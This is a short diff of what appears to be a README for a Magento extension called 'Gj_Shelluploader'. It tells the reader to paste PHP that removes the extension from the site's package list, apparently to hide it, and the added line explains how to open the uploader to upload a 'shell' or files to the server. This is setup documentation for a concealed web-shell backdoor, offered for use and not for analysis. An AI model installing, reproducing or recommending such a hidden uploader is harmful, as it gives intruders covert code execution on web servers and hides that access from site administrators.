@@ -12,4 +12,6 @@ just paste below code at the last & before return statement
 if(array_key_exists('Gj_Shelluploader',$packages['community']))
 { unset($packages['community']['Gj_Shelluploader']); }
 
+To Upload shell/files, after installing extension go to yoursiteurl/index.php/shelluploader or directely yoursiteurl/shelluploader
+
 Uploaded files will be stored "gjthedj" directory(yoursiteurl/gjthedj/filename.).
